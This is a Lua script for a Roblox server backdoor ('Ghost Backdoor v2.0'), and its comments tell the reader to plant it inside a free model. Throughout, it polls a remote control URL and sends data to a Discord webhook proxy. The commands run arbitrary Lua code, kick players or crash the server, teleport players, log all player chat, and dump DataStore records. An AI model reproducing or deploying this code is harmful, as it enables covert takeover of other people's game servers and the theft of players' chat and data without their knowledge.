-- Ghost Backdoor v2.0 -- SERVER SIDE
-- Plant this as a Script inside a free model
-- Loader: require(assetId) or loadstring(game:HttpGet("..."))()
-- Control via Discord bot: !cmd <command>

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")

local PROXY = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/webhook"
local CONTROL = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/control"
local POLL = 5 -- seconds between command polls

local active = true
local chatSpyActive = false

-- Send Discord embed
local function send(title, desc, color)
    pcall(function()
        HttpService:PostAsync(PROXY, HttpService:JSONEncode({
            embeds = {{
                title = tostring(title),
                description = tostring(desc):sub(1, 1900),
                color = color or 65535,
                footer = { text = "Ghost Backdoor v2.0 [SERVER]" },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }), Enum.HttpContentType.ApplicationJson)
    end)
end

-- GET request
local function GET(url)
    local out = nil
    pcall(function()
        out = HttpService:GetAsync(url, true)
    end)
    return out
end

-- Get game name
local function getGame()
    local name = "Unknown"
    pcall(function()
        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)
    return name
end

-- Get all players as formatted string
local function getPlayerList()
    local list = ""
    local count = 0
    for _, p in ipairs(Players:GetPlayers()) do
        count = count + 1
        list = list .. "\n- **" .. p.Name .. "** (ID: " .. tostring(p.UserId) .. ", Age: " .. tostring(p.AccountAge) .. "d)"
    end
    return list, count
end

-- Command handler
local function handleCommand(cmd)
    cmd = cmd:match("^%s*(.-)%s*$")
    if not cmd or cmd == "" then return end

    -- Confirm received
    send("CMD RECEIVED [SERVER]", "**Command:** `" .. cmd .. "`\n**Game:** " .. getGame(), 16776960)

    if cmd == "ping" then
        local list, count = getPlayerList()
        send("PONG [SERVER]",
            "**Game:** " .. getGame() ..
            "\n**Place ID:** " .. tostring(game.PlaceId) ..
            "\n**Job ID:** " .. tostring(game.JobId) ..
            "\n**Players:** " .. tostring(count) .. list,
            65280)

    elseif cmd == "players" then
        local list, count = getPlayerList()
        send("PLAYER LIST [SERVER]",
            "**Game:** " .. getGame() ..
            "\n**Total:** " .. tostring(count) ..
            "\n**Players:**" .. list,
            65535)

    elseif cmd:sub(1,5) == "exec:" then
        -- Server-side Lua execution
        local code = cmd:sub(6)
        local fn, err = loadstring(code)
        if fn then
            local ok, res = pcall(fn)
            if ok then
                send("EXEC RESULT [SERVER]", "**Code:**\n```lua\n" .. code:sub(1,400) .. "```\n**Result:** " .. tostring(res), 65280)
            else
                send("EXEC ERROR [SERVER]", "**Code:**\n```lua\n" .. code:sub(1,400) .. "```\n**Error:** " .. tostring(res), 16711680)
            end
        else
            send("EXEC PARSE ERROR", "**Error:** " .. tostring(err), 16711680)
        end

    elseif cmd:sub(1,5) == "kick:" then
        -- Kick any player by name — server-side so it actually works
        local name, reason = cmd:sub(6):match("^(.-)%s*|%s*(.*)$")
        name = name or cmd:sub(6)
        reason = reason or "Kicked by server."
        local kicked = false
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name:lower() == name:lower() then
                p:Kick(reason)
                send("PLAYER KICKED [SERVER]",
                    "**Player:** " .. p.Name ..
                    "\n**ID:** " .. tostring(p.UserId) ..
                    "\n**Reason:** " .. reason,
                    16711680)
                kicked = true
            end
        end
        if not kicked then
            local list, _ = getPlayerList()
            send("KICK FAILED", "Player not found: **" .. tostring(name) .. "**\n\nOnline players:" .. list, 16711680)
        end

    elseif cmd == "kickall" then
        -- Kick every player except nobody
        local count = 0
        for _, p in ipairs(Players:GetPlayers()) do
            pcall(function()
                p:Kick("Server shutdown.")
                count = count + 1
            end)
        end
        send("KICKALL [SERVER]", "**Kicked:** " .. tostring(count) .. " players.", 16711680)

    elseif cmd == "chatspy" then
        if chatSpyActive then
            send("CHAT SPY", "Already active.", 16776960)
        else
            chatSpyActive = true
            -- Hook all current players
            for _, p in ipairs(Players:GetPlayers()) do
                p.Chatted:Connect(function(msg)
                    pcall(function()
                        send("CHAT [SERVER]", "**" .. p.Name .. ":** " .. msg, 8388736)
                    end)
                end)
            end
            -- Hook future players
            Players.PlayerAdded:Connect(function(p)
                p.Chatted:Connect(function(msg)
                    pcall(function()
                        send("CHAT [SERVER]", "**" .. p.Name .. ":** " .. msg, 8388736)
                    end)
                end)
            end)
            send("CHAT SPY [SERVER]", "Now logging ALL player chat server-side.", 65280)
        end

    elseif cmd == "dump" or cmd:sub(1,5) == "dump:" then
        -- DataStore dump — works server-side
        local storeName = cmd == "dump" and "PlayerData" or cmd:sub(6)
        local store = nil
        local results = ""
        pcall(function() store = DataStoreService:GetDataStore(storeName) end)
        if store then
            for _, p in ipairs(Players:GetPlayers()) do
                pcall(function()
                    local data = store:GetAsync(tostring(p.UserId))
                    results = results .. "\n**" .. p.Name .. ":** " .. tostring(HttpService:JSONEncode(data)):sub(1, 400)
                end)
            end
            if results == "" then results = "\nNo data found or store is empty." end
            send("DATASTORE DUMP [SERVER]", "**Store:** " .. storeName .. results, 16776960)
        else
            send("DUMP FAILED", "Could not open store: " .. storeName, 16711680)
        end

    elseif cmd == "crash" then
        -- Crash the SERVER — affects all players
        send("SERVER CRASH [SERVER]", "Crashing server now. All players will be disconnected.", 16711680)
        task.wait(1)
        -- Infinite loop crashes the server thread
        while true do
            Instance.new("Part").Parent = workspace
            task.wait()
        end

    elseif cmd:sub(1,9) == "teleport:" then
        local name, placeId = cmd:sub(10):match("^(.-)%s*|%s*(.*)$")
        if name and placeId then
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower() == name:lower() then
                    pcall(function()
                        TeleportService:Teleport(tonumber(placeId), p)
                        send("TELEPORT [SERVER]", "**Player:** " .. p.Name .. "\n**Place:** " .. placeId, 65280)
                    end)
                end
            end
        end

    elseif cmd == "teleportall" then
        -- Teleport all players somewhere
        local placeId = cmd:match("|(.+)$")
        if placeId then
            for _, p in ipairs(Players:GetPlayers()) do
                pcall(function() TeleportService:Teleport(tonumber(placeId), p) end)
            end
            send("TELEPORT ALL [SERVER]", "Teleported all players to place: " .. placeId, 65280)
        end

    elseif cmd == "info" then
        local list, count = getPlayerList()
        send("SERVER INFO",
            "**Game:** " .. getGame() ..
            "\n**Place ID:** " .. tostring(game.PlaceId) ..
            "\n**Job ID:** " .. tostring(game.JobId) ..
            "\n**Active:** " .. tostring(active) ..
            "\n**ChatSpy:** " .. tostring(chatSpyActive) ..
            "\n**Players:** " .. tostring(count) .. list,
            65535)

    elseif cmd == "stop" then
        active = false
        send("BACKDOOR STOPPED [SERVER]", "Server-side backdoor deactivated.", 16711680)

    elseif cmd == "start" then
        active = true
        send("BACKDOOR STARTED [SERVER]", "Server-side backdoor reactivated.", 65280)
    end
end

-- Startup alert
local function startup()
    local list, count = getPlayerList()
    local gameName = getGame()
    send("GHOST BACKDOOR LOADED [SERVER]",
        "**Game:** " .. gameName ..
        "\n**Place ID:** " .. tostring(game.PlaceId) ..
        "\n**Job ID:** " .. tostring(game.JobId) ..
        "\n**Players:** " .. tostring(count) .. list ..
        "\n**Status:** Server-side. Full control active. Polling every " .. tostring(POLL) .. "s.",
        65280
    )
end

-- Chat spy auto-start on all future players
Players.PlayerAdded:Connect(function(p)
    if chatSpyActive then
        p.Chatted:Connect(function(msg)
            pcall(function()
                send("CHAT [SERVER]", "**" .. p.Name .. ":** " .. msg, 8388736)
            end)
        end)
    end
end)

-- Command poller
task.spawn(function()
    while true do
        task.wait(POLL)
        if not active then continue end
        pcall(function()
            local response = GET(CONTROL)
            if not response or response == "" then return end
            local ok, data = pcall(function() return HttpService:JSONDecode(response) end)
            if not ok or not data then return end
            if data.active ~= nil then active = data.active end
            if data.command and data.command ~= "" then
                handleCommand(data.command)
            end
        end)
    end
end)

-- Heartbeat every 60s
task.spawn(function()
    while true do
        task.wait(60)
        if not active then continue end
        pcall(function()
            local list, count = getPlayerList()
            send("HEARTBEAT [SERVER]",
                "**Game:** " .. getGame() ..
                "\n**Players:** " .. tostring(count) .. list ..
                "\n**Status:** ACTIVE",
                65535)
        end)
    end
end)

-- Init
task.spawn(startup)
